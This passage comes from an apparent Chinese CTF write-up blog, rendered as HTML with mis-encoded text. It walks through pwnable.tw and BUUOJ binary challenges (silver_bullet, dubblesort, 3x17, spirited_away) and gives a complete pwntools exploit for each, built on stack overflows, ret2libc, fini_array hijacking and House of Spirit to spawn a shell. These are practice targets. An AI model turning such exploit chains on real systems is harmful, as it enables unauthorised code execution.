class="number">366</span>, sh_addr)</span><br><span class="line">set_val(<span class="number">367</span>, int_0x80)</span><br><span class="line">set_val(<span class="number">368</span>, u32(<span class="string">b&#x27;/bin&#x27;</span>))</span><br><span class="line">set_val(<span class="number">369</span>, u32(<span class="string">b&#x27;/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/27/gMD5IuB6Lp4kWdN.png" alt="image.png"></p>
<h2 id="0x-pwnable-silverbullet-overwrite"><a href="#0x-pwnable-silverbullet-overwrite" class="headerlink" title="0x???.pwnable_silverbullet - overwrite"></a>0x???.pwnable_silverbullet - overwrite</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NXå’ŒRELRO</p>
<p><img src="https://i.loli.net/2021/02/27/rBO4dg9WVRAqK7H.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯å¯ä»¥åˆ›å»ºå­å¼¹ã€å¢å¼ºå­å¼¹ã€å°„å‡»ç‹¼äººï¼ˆ</p>
<p>åˆ›å»ºå­å¼¹çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/02/27/2DdyrePCI8v1mFA.png" alt="image.png"></p>
<p>ä¸éš¾çœ‹å‡ºï¼Œåœ¨mainå‡½æ•°çš„è°ƒç”¨æ ˆä¸Šç”¨å¦‚ä¸‹ç»“æ„ä½“è¡¨ç¤ºä¸€é¢—å­å¼¹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> content[<span class="number">0x30</span>];</span><br><span class="line">    <span class="type">int</span> power;</span><br><span class="line">&#125;silver_bullet;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´ç‚¹ä¸»è¦åœ¨äº<code>power_up()</code>å‡½æ•°ä¸­ï¼Œä½¿ç”¨<code>strncat()</code>å‡½æ•°è¿›è¡Œæ‹¼æ¥ï¼Œè¯¥å‡½æ•°ä¼šåœ¨å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ <code>&#39;\0&#39;</code>ï¼Œ<strong>å¯ä»¥é‡ç½®è®¡æ•°</strong>ï¼ŒåŒæ—¶é¢˜ç›®æ²¡å¼€åœ°å€éšæœºåŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥æº¢å‡ºåˆ°mainçš„è¿”å›åœ°å€ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œæ³„éœ²libcåœ°å€ä¸€å¥—å¸¦èµ°</p>
<p>æœ€ç»ˆæ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28297</span>)<span class="comment">#remote(&#x27;chall.pwnable.tw&#x27;, 10103)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./silver_bullet&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">47</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Oh ! You win !!\n&quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">47</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(<span class="number">0xdeadbeef</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/27/cmdyKHngVLFiJ8X.png" alt="image.png"></p>
<h2 id="0x-pwnable-dubblesort-ret2libc"><a href="#0x-pwnable-dubblesort-ret2libc" class="headerlink" title="0x???.pwnable_dubblesort - ret2libc"></a>0x???.pwnable_dubblesort - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/02/27/PLht9TuRaWy1MUZ.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/02/27/pG2ONZMKYmC9DwE.png" alt="image.png"></p>
<p>ä¸€å¼€å§‹å…ˆè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåé—¨è¾“å…¥è¦æ’åºçš„æ•°çš„æ•°é‡å’Œè¦æ’åºçš„æ•°ï¼Œåœ¨è¿™é‡Œæ£€æµ‹ä¸ä¸¥å¯†å¯¼è‡´æˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†å†™å‡½æ•°è¿”å›åœ°å€ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ•°å­—</p>
<p>é€šè¿‡æ ˆä¸Šæ®‹ç•™çš„æŒ‡é’ˆ + gdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—åˆ°libcçš„åŸºå€</p>
<p><img src="https://i.loli.net/2021/02/27/QdXWLnvjRx2agfP.png" alt="image.png"></p>
<blockquote>
<p>è¿™é‡Œæˆ‘æœ¬åœ°è°ƒå‡ºæ¥çš„ä¸å¯¹ï¼Œgdbè°ƒè¯•åˆæ²¡æ³•è£…è½½ä»–ç»™çš„libcï¼ˆformat errorï¼‰â€¦å°±å¾ˆç¦»è°±â€¦</p>
<p>æ‰‹åŠ¨è¯•äº†å‡ æ¬¡å‘ç°æˆ‘æœ¬åœ°å¤šä¸‰ä¸ªé¡µâ€¦</p>
</blockquote>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯¥è€ƒè™‘å¦‚ä½•è¦†å†™æ ˆä¸Šå†…å®¹çš„åŒæ—¶ä¸æ”¹å˜canaryåŒæ—¶ä¿æŒropé“¾çš„å®Œå¤‡æ€§</p>
<p>gdbè°ƒè¯•å¯çŸ¥canaryçš„å€¼å…¶å®æ˜¯å°äºlibcåŸºå€çš„</p>
<p><img src="https://i.loli.net/2021/02/27/VeTOK5sfwIF21ok.png" alt="image.png"></p>
<p>è€Œæˆ‘ä»¬çš„è¾“å…¥è¦æƒ³ä¸ç ´åcanaryï¼Œç»•è¿‡scanfåˆ™åªéœ€è¦è¾“å…¥<code>&#39;+&#39;</code>æˆ–<code>&#39;-&#39;</code>å³å¯</p>
<p>è€Œsystemçš„åœ°å€ä¹Ÿå°äº<code>/bin/sh</code>çš„åœ°å€ï¼Œä¸­é—´æˆ‘ä»¬åªéœ€è¦å¡«å……é€‚å½“å€¼å³å¯</p>
<p><img src="https://i.loli.net/2021/02/27/xA5WsPXHcJMErhL.png" alt="image.png"></p>
<p>æ•…æœ€ç»ˆçš„expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10101</span>)<span class="comment">#process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(p32(libc_leak))</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base = libc_leak - <span class="number">0x1b000a</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;35&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/27/LVh82fT6JQZHN3s.png" alt="image.png"></p>
<h2 id="0x-pwnable-317-fini-array-hijack"><a href="#0x-pwnable-317-fini-array-hijack" class="headerlink" title="0x???.pwnable_317 - fini_array hijack"></a>0x???.pwnable_317 - fini_array hijack</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/02/27/yzjRDksxLqfVa8E.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œé™æ€ç¼–è¯‘ + ç¬¦å·è¡¨æ‰£å…‰ï¼ˆæ‚²</p>
<p>é€šè¿‡<code>_start()</code>å‡½æ•°æˆ‘ä»¬èƒ½å¤Ÿäº†è§£åˆ°è¿™ä¸ªå‡½æ•°åº”å½“ä¸ºmainå‡½æ•°</p>
<p><img src="https://i.loli.net/2021/02/27/pBVklLQGU9zqPne.png" alt="image.png"></p>
<p>å…¶åŠŸèƒ½ä¸ºå¾€æŒ‡å®šåœ°å€å†™æœ€å¤§0x18å­—èŠ‚çš„æ•°æ®ï¼Œä½†æ˜¯åªèƒ½å†™ä¸€æ¬¡</p>
<p>ç”±äºç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œæ•…è€ƒè™‘åŠ«æŒ<code>fini_array</code>æ•°ç»„æ§åˆ¶ç¨‹åºæ‰§è¡Œæµä»¥get shell</p>
<p><img src="https://i.loli.net/2021/02/27/Bx7yVTuO6sGRj13.png" alt="image.png"></p>
<p>ä¸€å¼€å§‹åªèƒ½è¯»ä¸€æ¬¡ï¼Œé‚£ä¹ˆè€ƒè™‘åŠ«æŒ<code>fini_array[1]</code>ä¸ºmainã€<code>fini_array[1]</code>ä¸º<code>__libc_csu_fini()</code>ä»¥åå¤è¯»å…¥ï¼Œç”±äºrbpçš„å€¼ä¾¿æ˜¯<code>fini_array</code>ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°<code>fini_array</code>é™„è¿‘ï¼Œåœ¨è¿™é‡Œæ„é€ æˆ‘ä»¬çš„ropé“¾</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28247</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./3x17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line">csu_fini = <span class="number">0x402960</span></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">pop_rax_ret = e.search(asm(<span class="string">&#x27;pop rax ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_ret = e.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rdx_ret = e.search(asm(<span class="string">&#x27;pop rdx ; ret&#x27;</span>)).__next__()</span><br><span class="line">syscall = e.search(asm(<span class="string">&#x27;syscall&#x27;</span>)).__next__()</span><br><span class="line">leave_ret = e.search(asm(<span class="string">&#x27;leave ; ret&#x27;</span>)).__next__()</span><br><span class="line">ret = e.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr:<span class="built_in">int</span>, data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;addr:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;data:&quot;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    </span><br><span class="line">write(fini_array, p64(csu_fini) + p64(main))</span><br><span class="line">write(fini_array + <span class="number">0x10</span>, p64(pop_rax_ret) + p64(<span class="number">59</span>)) <span class="comment"># execve</span></span><br><span class="line">write(fini_array + <span class="number">0x20</span>, p64(pop_rdi_ret) + p64(fini_array + <span class="number">0x60</span>))</span><br><span class="line">write(fini_array + <span class="number">0x30</span>, p64(pop_rsi_ret) + p64(<span class="number">0</span>))</span><br><span class="line">write(fini_array + <span class="number">0x40</span>, p64(pop_rdx_ret) + p64(<span class="number">0</span>))</span><br><span class="line">write(fini_array + <span class="number">0x50</span>, p64(syscall))</span><br><span class="line">write(fini_array + <span class="number">0x60</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">write(fini_array, p64(leave_ret) + p64(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/02/27/Dl1hgcViX4sv93T.png" alt="image.png"></p>
<h2 id="0x-pwnable-spirited-away-House-of-Spirit"><a href="#0x-pwnable-spirited-away-House-of-Spirit" class="headerlink" title="0x???.pwnable_spirited_away - House of Spirit"></a>0x???.pwnable_spirited_away - House of Spirit</h2><p>æƒ¯ä¾‹çš„ checksecï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/09/10/V8oGk3vSJajbsA6.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>çº¢è‰²ç®­å¤´æ‰€æŒ‡åˆšå¥½å¯ä»¥å†™åˆ° ebp å‰é¢ï¼Œä¸€æ‰“å°å°±å¯ä»¥æŠŠæ ˆä¸Šæ•°æ®æ‰“å°å‡ºæ¥</p>
<p>è“è‰²ç®­å¤´æ‰€æŒ‡ä½¿ç”¨äº† sprintfï¼Œå‚¨å­˜çš„ä½ç½®åˆšå¥½åœ¨ nbytes ä¸Šé¢ï¼Œ<code>cnt</code> æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ¬¡æ•°ï¼ˆä¸‹æ–¹æœ‰ä¸ªå¤§å¾ªç¯å¯ä»¥è·³å› LABEL_2ï¼‰</p>
<p><img src="https://i.loli.net/2021/09/10/cl7sfARSbHMm14t.png" alt="image.png"></p>
<p>è¾“å…¥æ¬¡æ•°è¾¾åˆ° 100 æ—¶åˆšå¥½å¯ä»¥æº¢å‡ºä¸€ä¸ªå­—èŠ‚ <code>n</code> åˆ° nbytesï¼Œç”±æ­¤å¯ä»¥åœ¨è¯»å…¥ <code>s</code> æ—¶æº¢å‡ºåˆ° buf åŸŸåŠ«æŒæŒ‡é’ˆ</p>
<p><img src="https://i.loli.net/2021/09/10/dx9rvfSbUZYN34c.png" alt="image.png"></p>
<p>ebp æ³„éœ²æ ˆåœ°å€ï¼Œæ ˆä¸Šè¿˜æœ‰ä¸€ä¸ª stdout æ³„éœ² libc</p>
<p><img src="https://i.loli.net/2021/09/10/ElpQYMe2zJWH1nV.png" alt="image.png"></p>
<p>åœ¨æ ˆä¸Šå¸ƒç½®å¥½ä¸€ä¸ª chunk ç»“æ„åæ”¹å†™ buf ä¸ºæ ˆä¸Šåœ°å€å°±å¯ä»¥ rop äº†</p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯å½“æ•°é‡åœ¨ 10 ~ 99 è¿™ä¸ªåŒºé—´æ—¶ nbytes çš„ä½ç½®åˆšå¥½æ˜¯ <code>&#39;\0&#39;</code>ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ˜¯æ²¡æ³•è¿›è¡Œè¾“å…¥çš„</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;spirited_away&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26496</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your name:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;artt&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;nba3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_leak = u32(p.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.info(<span class="string">&#x27;stack leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base = libc_leak - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your name:&#x27;</span>, <span class="string">b&#x27;artt&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your age: &#x27;</span>, <span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your comment: &#x27;</span>, <span class="string">b&#x27;nba3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">    <span class="comment">#p.sendlineafter(b&#x27;Please enter your name:&#x27;, b&#x27;artt&#x27;)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter your age: &#x27;</span>, <span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your name:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + (p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>)).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x54</span> + p32(stack_leak - <span class="number">0x20</span> - <span class="number">0x50</span> + <span class="number">8</span> + <span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your name:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x40</span> + <span class="string">b&#x27;artt&#x27;</span> + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;nba3&#x27;</span> + p32(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Why did you came to see this movie? &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Please enter your comment: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Would you like to leave another comment? &lt;y/n&gt;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/09/10/JxmsOqrLG1EhYyV.png" alt="image.png"></p>
<h1 id="BJDCTF-2nd-Pwn"><a href="#BJDCTF-2nd-Pwn" class="headerlink" title="BJDCTF 2nd - Pwn"></a>BJDCTF 2nd - Pwn</h1><blockquote>
<p>å•å¼€åˆ†åŒºå¯¹æˆ‘æ¥è¯´çš„ç»“æœå°±æ˜¯æˆ‘å¥½å¤šé¢˜çš„åºå·éœ€è¦é‡æ’ï¼ˆæ¼ï¼‰</p>
</blockquote>
